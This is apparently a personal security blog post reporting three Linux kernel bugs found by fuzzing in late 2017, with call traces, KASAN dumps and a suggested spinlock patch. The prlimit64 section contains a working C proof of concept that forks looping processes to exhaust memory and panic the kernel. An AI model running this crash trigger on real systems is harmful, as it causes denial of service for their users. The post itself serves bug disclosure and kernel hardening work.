---
title: Linux Kernel - 2017-12 Founds
date: 2017-12-10
update: 2017-12-20
tags:
  - Security
  - Linux-Kernel
keywords:
  - 0-day
  - Bug
---

## spin-lock recursion bug (leading to deadlock)

There's no recursion check on spinlock where I found it (not exact). So when executed recursively, deadlock is triggered.
It needs to check current and calling thread id so that avoiding deadlock at recursive cases.

Below is pseudo-code for the patch.
```c
# spinlock - lock

...
long recursiveLockCount = 0;
...

if(ownThreadId == calledThreadId) {
	++recursiveLockCount;
	assert(recursiveLockCount > 0);
	return;
}
...

# spinlock - unlock

...
if(recursiveLockCount) {
	assert(ownThreadId == calledThreadId);
	--recursiveLockCount;
	return;
}
...
```

### Call Trace (Dump)
```c
Call Trace:
 __dump_stack lib/dump_stack.c:17 [inline]
 dump_stack+0x104/0x1c5 lib/dump_stack.c:53
 spin_bug kernel/locking/spinlock_debug.c:75 [inline]
 debug_spin_lock_before kernel/locking/spinlock_debug.c:84 [inline]
 do_raw_spin_lock+0x18c/0x1d0 kernel/locking/spinlock_debug.c:112
 rq_lock kernel/sched/sched.h:1766 [inline]
 ttwu_queue kernel/sched/core.c:1863 [inline]
 try_to_wake_up+0x98e/0x14e0 kernel/sched/core.c:2078
 wake_up_worker kernel/workqueue.c:839 [inline]
 insert_work+0x384/0x4d0 kernel/workqueue.c:1312
 __queue_work+0x537/0x1160 kernel/workqueue.c:1462
 queue_work_on+0x8f/0xa0 kernel/workqueue.c:1487
 queue_work include/linux/workqueue.h:488 [inline]
 call_usermodehelper_exec+0x2a7/0x470 kernel/umh.c:439
 call_modprobe kernel/kmod.c:99 [inline]
 __request_module+0x3ff/0xc00 kernel/kmod.c:171
 inet6_create+0xc56/0x1200 net/ipv6/af_inet6.c:156
 __sock_create+0x4c8/0x810 net/socket.c:1265
 sock_create net/socket.c:1305 [inline]
 SYSC_socket net/socket.c:1335 [inline]
 SyS_socket+0xdb/0x190 net/socket.c:1315
 entry_SYSCALL_64_fastpath+0x1f/0x96
RIP: 0033:0x4565b9
RSP: 002b:00007f85ab8b2bd8 EFLAGS: 00000216 ORIG_RAX: 0000000000000029
RAX: ffffffffffffffda RBX: 00007f85ab8b3700 RCX: 00000000004565b9
RDX: 0000000000000004 RSI: 0000000000000800 RDI: 000000000000000a
RBP: 00007ffc612e5ac0 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000216 R12: 00007ffc612e5a3e
R13: 00007ffc612e5a3f R14: 00007f85ab8b3700 R15: 00007f85ab8b39c0
```

## unwind_orc - stack out-of-bound

* Read 8 bytes stack oob in unwind_next_frame

I just found the bug stack OOB (8 bytes read) in unwind_orc. So, I just tested it on the latest LK (v4.15.0-rc4 currently),
and it worked. But, I found the commit about this bug(?).
He (Commiter) said...

> "The ORC unwinder got confused by some kprobes changes, which isn't
surprising since the runtime code no longer matches vmlinux, and the
stack was modified for kretprobes. <br />
Until we have a way for generated code to register changes with the
unwinder, these types of warnings are inevitable.  So just disable KASAN
checks for stack accesses in the ORC unwinder."

Also, you can see it [here](https://github.com/torvalds/linux/commit/881125bfe65bb772f34f4fcb04a35dfe117e186a)
It was found & patched at LK v4.14.0-rc8 on 2017/11/8.

In short, it is intended! not a BUG. In addition, if it is a bug, it just a kinda memory disclosure useless :|.

### Before & After
```c
@@ -279,7 +279,7 @@ static bool deref_stack_reg(struct unwind_state *state, unsigned long addr,
 	if (!stack_access_ok(state, addr, sizeof(long)))
 		return false;
 
-	*val = READ_ONCE_TASK_STACK(state->task, *(unsigned long *)addr);
+	*val = READ_ONCE_NOCHECK(*(unsigned long *)addr);
 	return true;
 }
 
```

see the difference? yes, READ_ONCE_TASK_STACK to READ_ONCE_NOCHECK.

### Call Trace (Dump)
```c
BUG: KASAN: stack-out-of-bounds in deref_stack_regs arch/x86/kernel/unwind_orc.c:302 [inline]
BUG: KASAN: stack-out-of-bounds in unwind_next_frame+0x15a6/0x1e60 arch/x86/kernel/unwind_orc.c:438
Read of size 8 at addr ffff8800762674f0 by task syz-executor3/2870

CPU: 2 PID: 2870 Comm: syz-executor3 Not tainted 4.15.0-rc3+ #3
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:17 [inline]
 dump_stack+0x104/0x1cd lib/dump_stack.c:53
 print_address_description+0x60/0x224 mm/kasan/report.c:252
 kasan_report_error mm/kasan/report.c:351 [inline]
 kasan_report+0x16b/0x260 mm/kasan/report.c:409

The buggy address belongs to the page:
page:00000000f387e2cc count:0 mapcount:0 mapping:          (null) index:0x0
flags: 0x500000000000000()
raw: 0500000000000000 0000000000000000 0000000000000000 00000000ffffffff
raw: ffffea0001d899e0 ffffea0001d899e0 0000000000000000 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff880076267380: f2 f2 f2 f2 f2 f2 00 f2 f2 f2 f2 f2 f2 f2 00 00
 ffff880076267400: f2 f2 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00
>ffff880076267480: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1
                                                             ^
 ffff880076267500: f1 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2
 ffff880076267580: f2 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2
==================================================================
Kernel panic - not syncing: panic_on_warn set ...

CPU: 2 PID: 2870 Comm: syz-executor3 Tainted: G    B            4.15.0-rc3+ #3
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:17 [inline]
 dump_stack+0x104/0x1cd lib/dump_stack.c:53
 panic+0x1aa/0x39b kernel/panic.c:183
 kasan_end_report+0x43/0x49 mm/kasan/report.c:176
 kasan_report_error mm/kasan/report.c:356 [inline]
 kasan_report.cold.5+0xb5/0xe1 mm/kasan/report.c:409
Dumping ftrace buffer:
   (ftrace buffer empty)
Kernel Offset: 0x15000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 86400 seconds..
```

## prlimit64 (leading to kernel panic)

W4F, not serious :).

I just found a crash on LK v4.15.x (maybe the most of LKs). It has to happen.
Because, resizing limitation of MSGQUEUE to **0** and calling socket$xxx repeatedly, as result, occurs OOM (out of memory).

### PoC
> gcc -o poc -std=c99 poc.c

```c
#define _GNU_SOURCE 

#include <unistd.h>

#include <sys/types.h>
#include <sys/syscall.h>

static void test();

void loop() {
	while (1) test();
}

void test() {
	syscall(__NR_mmap, 0x20000000, 0x9000, 0x3, 0x32, -1, 0);  // just space
	syscall(__NR_prlimit64, 0x0, 0x7, 0x20000000, 0x20000000); // 0x7 => RLIMIT_MSGQUEUE
	syscall(__NR_socket, 0x2, 0x1, 0x0);                       // socket$inet_tcp
}

void main(int argc, char *argv[], char **envp) {
	for (int i = 0; i < 8; ++i) {
		int pid = fork();
		if (pid == 0) {
			loop();
			return;
		}
	}

	sleep(1000000); // wait
}
```

### Call Trace (Dump)
```c
[   61.885712] CPU: 1 PID: 1 Comm: init Not tainted 4.15.0-rc4+ #4
[   61.885987] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[   61.886426] Call Trace:
[   61.886553]  dump_stack+0x104/0x1cd
[   61.886723]  ? _atomic_dec_and_lock+0x153/0x153
[   61.886945]  panic+0x1aa/0x39b
[   61.887095]  ? add_taint.cold.3+0x16/0x16
[   61.887291]  ? blocking_notifier_call_chain+0xc5/0x160
[   61.887533]  ? srcu_init_notifier_head+0x80/0x80
[   61.887752]  ? rcutorture_record_progress+0x10/0x10
[   61.887981]  ? save_trace+0x2f0/0x2f0
[   61.888170]  out_of_memory.cold.38+0x1e/0x64
[   61.888378]  ? oom_killer_disable+0x2c0/0x2c0
[   61.888604]  ? mutex_trylock+0x1fe/0x260
[   61.888791]  ? __alloc_pages_slowpath+0x119d/0x29c0
[   61.889023]  ? ww_mutex_lock.part.2+0xf0/0xf0
[   61.889243]  ? __alloc_pages_slowpath+0x1f6c/0x29c0
[   61.889481]  ? sched_clock+0x5/0x10
[   61.889656]  ? warn_alloc+0x110/0x110
[   61.889833]  ? lock_downgrade+0x690/0x690
[   61.890028]  ? lock_release+0xff0/0xff0
[   61.890222]  ? radix_tree_lookup_slot+0x91/0xd0
[   61.890439]  ? rcutorture_record_progress+0x10/0x10
[   61.890670]  ? rcu_read_lock_sched_held+0xe4/0x120
[   61.890901]  ? find_get_entry+0x50c/0xa10
[   61.891092]  ? __alloc_pages_slowpath+0x29c0/0x29c0
[   61.891334]  ? __lock_acquire+0x7a7/0x40c0
[   61.891530]  ? debug_check_no_locks_freed+0x200/0x200
[   61.891769]  ? pvclock_read_flags+0x150/0x150
[   61.891977]  ? save_trace+0x2f0/0x2f0
[   61.892163]  ? kvm_sched_clock_read+0x21/0x30
[   61.892370]  ? sched_clock+0x5/0x10
[   61.892538]  ? sched_clock_cpu+0x18/0x170
[   61.892733]  ? kvm_sched_clock_read+0x21/0x30
[   61.892940]  ? sched_clock+0x5/0x10
[   61.893108]  ? find_held_lock+0x39/0x1c0
[   61.893306]  ? __lock_is_held+0xb4/0x140
[   61.893497]  ? rcutorture_record_progress+0x10/0x10
[   61.893736]  ? __alloc_pages_nodemask+0x8e6/0xbc0
[   61.893961]  ? __alloc_pages_slowpath+0x29c0/0x29c0
[   61.894195]  ? find_get_pages_contig+0xf60/0xf60
[   61.894415]  ? deref_stack_reg+0x9b/0x100
[   61.894608]  ? kvm_sched_clock_read+0x21/0x30
[   61.894814]  ? sched_clock+0x5/0x10
[   61.894982]  ? sched_clock_cpu+0x18/0x170
[   61.895178]  ? save_trace+0x2f0/0x2f0
[   61.895354]  ? __lock_acquire+0x7a7/0x40c0
[   61.895560]  ? alloc_pages_current+0xac/0x1e0
[   61.895768]  ? __page_cache_alloc+0x2ed/0x360
[   61.895977]  ? find_held_lock+0x39/0x1c0
[   61.896218]  ? page_endio+0x760/0x760
[   61.896406]  ? filemap_fault+0xd41/0x1930
[   61.896605]  ? __lock_page_or_retry+0x4c0/0x4c0
[   61.896820]  ? rcutorture_record_progress+0x10/0x10
[   61.897048]  ? pvclock_read_flags+0x150/0x150
[   61.897263]  ? filemap_map_pages+0xbe3/0x1350
[   61.897476]  ? __lock_acquire+0x7a7/0x40c0
[   61.897667]  ? find_get_pages_range_tag+0xf10/0xf10
[   61.897899]  ? save_trace+0x2f0/0x2f0
[   61.898074]  ? kvm_sched_clock_read+0x21/0x30
[   61.898289]  ? sched_clock+0x5/0x10
[   61.898461]  ? debug_check_no_locks_freed+0x200/0x200
[   61.898701]  ? save_trace+0x2f0/0x2f0
[   61.898881]  ? find_held_lock+0x39/0x1c0
[   61.899071]  ? ext4_filemap_fault+0x78/0xa7
[   61.899276]  ? lock_acquire+0x15b/0x430
[   61.899461]  ? lock_contended+0xe70/0xe70
[   61.899654]  ? lock_release+0xff0/0xff0
[   61.899849]  ? down_read+0xb5/0x180
[   61.900018]  ? down_write_killable_nested+0x190/0x190
[   61.900269]  ? ext4_filemap_fault+0x80/0xa7
[   61.900468]  ? __do_fault+0xd8/0x360
[   61.900641]  ? print_bad_pte+0x5b0/0x5b0
[   61.900831]  ? pvclock_read_flags+0x150/0x150
[   61.901039]  ? __handle_mm_fault+0x11d9/0x3080
[   61.901255]  ? sched_clock+0x5/0x10
[   61.901422]  ? sched_clock_cpu+0x18/0x170
[   61.901612]  ? find_held_lock+0x39/0x1c0
[   61.901801]  ? vm_insert_mixed_mkwrite+0x30/0x30
[   61.902020]  ? lock_acquire+0x15b/0x430
[   61.902209]  ? lock_downgrade+0x690/0x690
[   61.902401]  ? kvm_sched_clock_read+0x21/0x30
[   61.902607]  ? lock_release+0xff0/0xff0
[   61.902791]  ? do_raw_spin_trylock+0x180/0x180
[   61.903006]  ? _raw_spin_unlock_irqrestore+0x46/0x60
[   61.903245]  ? trace_hardirqs_on_caller+0x381/0x570
[   61.903476]  ? remove_wait_queue+0x188/0x250
[   61.903678]  ? save_trace+0x2f0/0x2f0
[   61.903854]  ? lock_acquire+0x15b/0x430
[   61.904036]  ? __do_page_fault+0x2f6/0xb50
[   61.904225]  ? do_wait+0x425/0xa20
[   61.904389]  ? lock_release+0xff0/0xff0
[   61.904572]  ? wait_consider_task+0x3500/0x3500
[   61.904796]  ? rcu_note_context_switch+0x6e0/0x6e0
[   61.905021]  ? cpu_extra_stat_show+0x10/0x10
[   61.905231]  ? handle_mm_fault+0x12e/0x390
[   61.905429]  ? __do_page_fault+0x4fa/0xb50
[   61.905627]  ? vmalloc_fault+0x930/0x930
[   61.905813]  ? SyS_waitid+0x40/0x40
[   61.905986]  ? do_page_fault+0xb5/0x5b0
[   61.906176]  ? __do_page_fault+0xb50/0xb50
[   61.906372]  ? SYSC_wait4+0x95/0x110
[   61.906543]  ? kernel_wait4+0x330/0x330
[   61.906728]  ? syscall_return_slowpath+0x2cd/0x450
[   61.906957]  ? entry_SYSCALL_64_fastpath+0x4b/0x96
[   61.907192]  ? async_page_fault+0x36/0x60
[   61.907393]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[   61.907618]  ? async_page_fault+0x36/0x60
[   61.907810]  ? async_page_fault+0x4c/0x60
[   61.908170] Kernel Offset: 0x2b200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   61.908670] ---[ end Kernel panic - not syncing: Out of memory and no killable processes...
[   61.908670]
```

As a result, kernel panic is triggered because of OOM (Out Of Memory).

**End**
